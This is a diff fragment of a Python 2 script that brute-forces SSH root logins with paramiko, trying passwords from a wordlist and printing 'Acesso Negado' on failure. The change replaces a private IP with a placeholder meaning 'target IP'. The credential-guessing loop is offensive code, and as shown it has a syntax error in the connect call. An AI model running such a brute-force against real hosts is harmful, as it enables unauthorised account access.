@@ -9,7 +9,7 @@ for line in f.readlines():
 
 	try:
 
-		ssh.connect("192.168.0.17", username"root", password=line)
+		ssh.connect("IP.ALVO.0.1", username"root", password=line)
 
 	except paramiko.AuthenticationException:
 		print "Acesso Negado",line
